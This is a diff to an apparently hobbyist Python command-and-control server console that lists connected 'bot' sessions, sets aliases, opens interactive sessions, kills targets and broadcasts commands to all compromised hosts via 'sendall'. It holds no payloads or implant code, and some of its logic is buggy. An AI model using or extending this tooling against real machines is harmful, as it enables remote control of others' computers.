@@ -8,7 +8,9 @@ import time
 import threading
 from banner import banner, Colour
 
-start_flag = True
+from bot import Bot
+
+global start_flag
 
 def c2_help_manual():
     print('''\n
@@ -42,6 +44,11 @@ def accept_connections():
         except:
             pass
 
+def start_accepting_connections(sock):
+    t1 = threading.Thread(target=accept_connections)
+    t1.start()
+    return t1
+
 def print_banner_and_initial_info():
     print(banner())
     print('Run "help" command to see the usage manual')
@@ -57,23 +64,42 @@ def list_targets():
 
 def set_alias(command):
     session_id = int(command[5:])
-    if session_id>=len(Bot.botCount):
+    if session_id>=Bot.botCount:
         print('[-] No Session Under That ID Number.')
         return
     Bot.botList[session_id].alias = input('Enter new alias for session '+ str(session_id) + ':')
     print(alias)
 
-def start_accepting_connections(sock):
-    t1 = threading.Thread(target=accept_connections)
-    t1.start()
-    return t1
+def close_all_target_connections():
+    for target in Bot.botList:
+        target.kill()
 
+def join_thread(t1):
+    t1.join()
+
+def close_socket(sock):
+    sock.close()
+    start_flag = False
+
+def exit_c2_server(sock, t1):
+    close_socket(sock)
+    join_thread(t1)
+    print(Colour().yellow('\n[-] C2 Socket Closed! Bye!!'))
+
+
+def kill_target(command):
+    target = int(command[5:])
+    if target >= Bot.botCount:
+        print('[-] No Session Under That ID Number.')
+        return
+    Bot.botList[target].kill()
+    
 
 def handle_session_command(command):
     try:
         session_id = int(command[8:])
-        bot = Bot.botList[session_id]
-        bot.communication(target, ip,alis)
+        i = Bot.botList[session_id]
+        i.communication()
     except Exception as e:
         print('[-] No Session Under That ID Number. Error: ', e)
 
@@ -81,11 +107,10 @@ def handle_session_command(command):
 def send_all(command):
     print(Colour.blue(f'Number of sessions {Bot.botCount}'))
     print(Colour.green('Target sessions!'))
-    i = 0
     try:
-        for i in Bot.botList:
-            print(i.target)
-            i.reliable_send(command)
+        for target in Bot.botList:
+            print(target.target)
+            target.reliable_send(command)
     except Exception as e:
         print(f'Failed to send command to all targets. Error: {e}')
 
@@ -94,6 +119,7 @@ def clear_c2_console():
     os.system('clear')
 
 def run_c2_server(sock, t1):
+    global start_flag
     while start_flag:
         try:
             command = input('[**] Command & Control Center: ')
@@ -106,10 +132,10 @@ def run_c2_server(sock, t1):
             elif command[:5] == 'alias':
                 set_alias(command)
             elif command == 'exit':
-                close_all_target_connections(targets)
+                close_all_target_connections()
                 start_flag = exit_c2_server(sock, t1)
             elif command[:4] == 'kill':
-                kill_target(targets, ips, command)
+                kill_target(command)
             elif command[:7] == 'sendall':
                 send_all(command)
             elif command[:4] == 'help':
@@ -127,6 +153,7 @@ def run_c2_server(sock, t1):
 
 
 if __name__ == '__main__':
+    start_flag = True
     sock = initialise_socket()
     t1 = start_accepting_connections(sock)
     print_banner_and_initial_info()
